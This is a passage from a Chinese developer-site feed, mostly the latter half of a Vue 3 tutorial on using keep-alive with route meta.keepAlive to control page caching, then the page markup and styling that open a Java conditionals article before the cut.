<p>使用 <code>&lt;keep-alive&gt;</code> 缓存“探索”页后，返回时组件从缓存中激活，之前的 ref 值和 DOM 滚动位置依然保留。这保证了用户回到列表页时，能够看到原先浏览到的内容和筛选状态。</p>
<p>可以在组件中配合路由导航守卫保存和恢复滚动条位置：</p>
<ul>
<li>在 <code>onBeforeRouteLeave</code> 钩子中记录 <code>scrollTop</code>。</li>
<li>在 <code>onActivated</code> 钩子中恢复滚动条位置。</li>
</ul>
<hr/>
<h3 data-id="heading-11">三、使用中的问题：Name 匹配的陷阱</h3>
<h4 data-id="heading-12">3.1 问题场景</h4>
<p>我们经常希望缓存某些页面状态，同时让某些页面不被缓存，例如：</p>
<ul>
<li>“探索”列表页：需要缓存。</li>
<li>登录/注册页：不需要缓存。</li>
<li>文章详情页：通常不缓存。</li>
</ul>
<h4 data-id="heading-13">3.2 第一次尝试：手动定义 Name</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup&gt;
defineOptions({ name: 'Explore' })
&lt;/script&gt;
</code></pre>
<p>然后在主组件中使用 <code>include</code> 指定名称：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;router-view v-slot="{ Component }"&gt;
  &lt;keep-alive include="Home,Explore,UserCenter"&gt;
    &lt;component :is="Component" /&gt;
  &lt;/keep-alive&gt;
&lt;/router-view&gt;
</code></pre>
<p>理论上只缓存 <code>Home</code>、<code>Explore</code>、<code>UserCenter</code>。</p>
<h4 data-id="heading-14">3.3 问题出现：为什么 Include 不生效？</h4>
<ul>
<li><strong>组件名称不匹配</strong>：include/exclude 匹配的是组件自身的 <code>name</code> 属性，而非路由配置中的 <code>name</code>。</li>
<li><strong>自动生成的 Name</strong>：Vue 3.2.34+ 使用 <code>&lt;script setup&gt;</code> 会自动根据文件路径生成组件名，手动写的 name 可能与自动生成冲突。</li>
<li><strong>路由包装机制</strong>：Vue Router 渲染组件时可能进行包装，导致组件实际名称与原始组件不同。</li>
</ul>
<p>依赖组件名匹配容易出错，需要更灵活的方法。</p>
<hr/>
<h3 data-id="heading-15">四、解决方式：深入理解底层逻辑</h3>
<h4 data-id="heading-16">4.1 理解组件 Name 的生成机制</h4>
<p>Vue 3.2.34+ 使用 <code>&lt;script setup&gt;</code> 的单文件组件会自动根据文件名推断组件的 <code>name</code>。</p>
<ul>
<li><code>src/pages/Explore/index.vue</code> → 组件名 <code>Explore</code></li>
<li><code>src/pages/User/Profile.vue</code> → 组件名 <code>Profile</code></li>
</ul>
<p>无需手动定义 name，避免与自动推断冲突。</p>
<h4 data-id="heading-17">4.2 问题根源分析</h4>
<ul>
<li>自动 Name 与路由名不一致。</li>
<li>Router 的组件包装可能导致 <code>&lt;keep-alive&gt;</code> 无法捕获组件原始 name。</li>
</ul>
<h4 data-id="heading-18">4.3 解决方案：路由 Meta 控制缓存</h4>
<ol>
<li><strong>移除手动定义的 Name</strong></li>
</ol>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup lang="js"&gt;
// Vue 会自动根据路径生成 name
&lt;/script&gt;
</code></pre>
<ol start="2">
<li><strong>在路由配置中设置 Meta</strong></li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/explore'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Explore'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@/pages/Explore/index.vue'</span>),
    <span class="hljs-attr">meta</span>: { <span class="hljs-attr">title</span>: <span class="hljs-string">'探索'</span>, <span class="hljs-attr">keepAlive</span>: <span class="hljs-literal">true</span> }
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/login'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Login'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@/pages/Auth/index.vue'</span>),
    <span class="hljs-attr">meta</span>: { <span class="hljs-attr">title</span>: <span class="hljs-string">'登录'</span>, <span class="hljs-attr">keepAlive</span>: <span class="hljs-literal">false</span> }
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/article/:id'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'ArticleDetail'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@/pages/ArticleDetail/index.vue'</span>),
    <span class="hljs-attr">meta</span>: { <span class="hljs-attr">title</span>: <span class="hljs-string">'文章详情'</span>, <span class="hljs-attr">keepAlive</span>: <span class="hljs-literal">false</span> }
  }
]
</code></pre>
<ol start="3">
<li><strong>在 App.vue 中根据 Meta 控制</strong></li>
</ol>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup lang="js"&gt;
import { computed } from 'vue'
import { useRoute } from 'vue-router'

const route = useRoute()
const shouldCache = computed(() =&gt; route.meta?.keepAlive !== false)
&lt;/script&gt;

&lt;template&gt;
  &lt;router-view v-slot="{ Component }"&gt;
    &lt;keep-alive v-if="shouldCache"&gt;
      &lt;component :is="Component" /&gt;
    &lt;/keep-alive&gt;
    &lt;component v-else :is="Component" /&gt;
  &lt;/router-view&gt;
&lt;/template&gt;
</code></pre>
<p>默认缓存所有页面，只有 <code>meta.keepAlive</code> 明确为 <code>false</code> 时才不缓存。</p>
<h4 data-id="heading-19">4.4 方案优势</h4>
<ul>
<li>灵活性强：缓存策略直接写在路由配置中。</li>
<li>可维护性好：缓存策略集中管理。</li>
<li>避免匹配失败：不依赖手动 name。</li>
<li>默认友好：设置默认缓存，仅对不需要缓存页面标记即可。</li>
</ul>
<hr/>
<h3 data-id="heading-20">五、最佳实践总结</h3>
<h4 data-id="heading-21">5.1 缓存策略建议</h4>








































<table><thead><tr><th>页面类型</th><th>是否缓存</th><th>缓存原因</th></tr></thead><tbody><tr><td>首页（静态）</td><td>❌ 不缓存</td><td>内容简单，一般无需缓存</td></tr><tr><td>列表/浏览页</td><td>✅ 缓存</td><td>保持筛选条件、分页状态、滚动位置等</td></tr><tr><td>详情页</td><td>❌ 不缓存</td><td>每次展示不同内容，应重新加载</td></tr><tr><td>表单页</td><td>❌ 不缓存</td><td>避免表单数据残留</td></tr><tr><td>登录/注册页</td><td>❌ 不缓存</td><td>用户身份相关，每次重新初始化</td></tr><tr><td>个人中心/控制台</td><td>✅ 缓存</td><td>保留子页面状态，提升体验</td></tr></tbody></table>
<h4 data-id="heading-22">5.2 代码规范</h4>
<ul>
<li>不要手动定义 Name，在 Vue 3.2.34+ 中自动推断。</li>
</ul>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup&gt;
// Vue 会自动推断 name
&lt;/script&gt;
</code></pre>
<ul>
<li>使用路由 Meta 控制缓存。</li>
<li>统一在 App.vue 中处理缓存逻辑。</li>
</ul>
<h4 data-id="heading-23">5.3 生命周期钩子的使用</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup&gt;
import { onActivated, onDeactivated } from 'vue'

onActivated(() =&gt; {
  console.log('组件被激活（从缓存恢复）')
})

onDeactivated(() =&gt; {
  console.log('组件被停用（进入缓存）')
})
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-24">5.4 性能考虑</h4>
<ul>
<li>内存占用：不要无限制缓存过多页面，可使用 <code>max</code> 限制。</li>
<li>数据刷新：在 <code>onActivated</code> 中进行必要更新。</li>
<li>缓存清理：登出或不常用页面可手动清除缓存。</li>
<li>动画与过渡：确保 <code>&lt;keep-alive&gt;</code> 和 <code>&lt;transition&gt;</code> 嵌套顺序正确。</li>
</ul>
<hr/>
<h3 data-id="heading-25">六、总结</h3>
<h4 data-id="heading-26">6.1 关键要点</h4>
<ul>
<li><code>&lt;keep-alive&gt;</code> 缓存组件实例，通过停用保留状态。</li>
<li>include/exclude 功能依赖组件 <code>name</code>。</li>
<li>推荐使用路由 <code>meta.keepAlive</code> 控制缓存。</li>
<li>缓存组件支持 <code>onActivated</code> / <code>onDeactivated</code> 钩子。</li>
<li>默认缓存大部分页面，只对需刷新页面明确禁用。</li>
</ul>
<h4 data-id="heading-27">6.2 技术演进</h4>
<p>手动定义 Name → 自动 Name → Meta 控制</p>
<ul>
<li>冗长易错 → 简化代码 → 灵活可靠</li>
</ul>
<h4 data-id="heading-28">6.3 最终方案</h4>
<ul>
<li>利用自动生成的组件名取消手动命名。</li>
<li>通过路由 <code>meta.keepAlive</code> 控制缓存。</li>
<li>在根组件统一处理缓存逻辑。</li>
<li>默认缓存，明确例外。</li>
</ul>
<p>这样既保持了代码简洁，又实现了灵活可控的缓存策略，确保用户在页面切换时能获得更好的体验。</p>
<hr/>
<h3 data-id="heading-29">参考资料</h3>
<ul>
<li>Vue 3 Keep-Alive 官方文档</li>
<li>Vue Router 官方文档</li>
<li>Vue 3.2.34 更新日志</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java条件判断：程序的"决策大脑"]]></title>    <link>https://juejin.cn/post/7580282751628132393</link>    <guid>https://juejin.cn/post/7580282751628132393</guid>    <pubDate>2025-12-06T09:54:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580282751628132393" data-draft-id="7580297762189951017" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java条件判断：程序的&quot;决策大脑&quot;"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-12-06T09:54:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="吃西红柿长大的番茄"/> <meta itemprop="url" content="https://juejin.cn/user/3097787706900985"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java条件判断：程序的"决策大脑"
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3097787706900985/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    吃西红柿长大的番茄
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T09:54:02.000Z" title="Sat Dec 06 2025 09:54:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAIRlWElmTU0AKgAAAAgABQESAAMAAAABAAEAAAEaAAUAAAABAAAASgEbAAUAAAABAAAAUgEoAAMAAAABAAIAAIdpAAQAAAABAAAAWgAAAAAAAABIAAAAAQAAAEgAAAABAAOgAQADAAAAAQABAACgAgAEAAAAAQAAACCgAwAEAAAAAQAAACAAAAAAX7wP8AAAAAlwSFlzAAALEwAACxMBAJqcGAAAAVlpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IlhNUCBDb3JlIDYuMC4wIj4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAgICAgICAgeG1sbnM6dGlmZj0iaHR0cDovL25zLmFkb2JlLmNvbS90aWZmLzEuMC8iPgogICAgICAgICA8dGlmZjpPcmllbnRhdGlvbj4xPC90aWZmOk9yaWVudGF0aW9uPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KGV7hBwAABWVJREFUWAnlVktsVFUY/s85997pC9BOTKxRWnEKsXWlxjWJj0RWJjrFAAXjAlewYWOkgauACVu7a2IiNUEyExM3yoZE3Wmi7qgPJthJBDE6JUNpO3Mf5/j95/bOTOcBlBgXejJ37rn/Of/7O/9/iP7vQ/zTAcjnC4ry+a5ii1OkiYTpuvjvEc0Gp51uivP+ZW+QBuSW4QjW5rptAa1Ey0uOGKOxwPetVyafN6p/52/PkNBbjdAhGaGEpMRjLZTryB8+9MUSYSGNRIcBvm8kBAY9tHYlHz78nTs392xIkwv9FA3Oe33bdoX1ZZKOS0bH0CXI6RugYLW6BwIu5gskkQ4sEG0wYF25PjBzbZfSYY6kDLUmWMt7FR7Lw3xYUkaTdjxHfTPnPwav0iEGYADVa9XIRIEyxrAA0jIQxgFL22gYwF7A8/DAzNVdksJvJaTEUZ2kYnZWziN5s1ADPHneEIXByotYuMSrf9JEbbsuv7VcvbaKML8plXtQR0EdIYDqWEmtOgAomZFH8EjWSnek2ulmtljljttHbmaIHCCCHzd9MjwfsmscBeZH9Jyd10nMvz92UQrtCBKvMF06mQy0SiEdRMEGg8mN0YjAlgoDDkPrMI5qJKSkKKydpbB2CZjJkhIBvOBw2CGQgii85bpx//dMqFRKam5uvH7w+K97oe+Cl0HO68uIBH0qyEzpOMwIbZIcFq0I+9cwoElizCjk2KFI1y7Nnx614W1db58fOXIlMzs7Xn/jeDmvBV2Q0mXjGf554O/m4LZHp2N8r61WPMvLZWLdiC4GMAk5BjeeB5lhv39l6+BIbu3m760hXMDKBD08XBKzR8fr04nygnIypOOAJUx/fHrsi0Mnys+vVK+V4VUohaiyPCo2Q9DFALvF/ikw8WS4QvVZALS5ksw47/7R8ejgTPk1UFqU6/3zp8bOM7B/kdu/fkguPGU5JibW+F0sTjWOUw8DklRrg4BiLGeBqbaRLxjlT4no0InFV402RcftJz41cH/f/JnHP3kZaaF6VX/liwist9vYG5+NU9Cg3MNkt/+lU5wS8fTxq3mc7ILjDlAE4CJpe89BOWPiIjBhi9O6PI4G1jsc6RGB3lZwmS76k8H0zOKTkFboG8jS2krFKCX2fvTeaPHIBwAkMHHgncURnL3nuCSnxSopdIzN5th0BIonJ0Lf9yUA9iMkzdRWl3BixOusfDcwQVcS4UKIFwYfGPnM8wY/DyP9NFMXaTE5BU39tGkDgGZz+fJJG0oYcSaOafLcqdECY4LzfSObSzyUOgxqtyisr8SSNOOAkubWoh3TTaeA2YtFEXPnm5x81/j+6MI6JqyS25WSNU6hbCMKHG84marJbdR+vwakRhQLRuQpbzHRLjmpmijI+OmWCtq+LzWtnX5v30gHSsqmWne74DtiACi2+Wz0iXbuLt9D2cDyoPEkWOiyp5XUIwLMi/wJY1FbH5B9ONtdC1KrsD/Q0MCQAS0wccILORDW25amAeOtooAj/KQxfzF17uwTSQ1v3dJ7jnLINwdZYRDa4tPU0sHVXFo/vxFF5BqFqxRfOmgPCk4ft2NgKTCy2Y47JIEg+MIhjYsLy5I25qUYTQlCjMRHsr/UwdYwIK33UO1J5fFNB9XNO6akcywJofVmXQDP2wfrSPcI2xG5BSs3I+IosHr4EtvO1TDAu16xHQq5+ykMblfRXLbhEoFIdDTBdhldvzl+3CMg60ZktI2vNzLW6IIp0waLklot9L63yzuUp8dJd7bglPFe3hIXstBEP58/s6Ocyr4rH2+866ZNbriTzA0RSOWCwakMl1QJgculxPt8Z7O5GLdtW6bvU8R/nO1vb+hMExVAVtEAAAAASUVORK5CYII=");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"•";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,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");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body 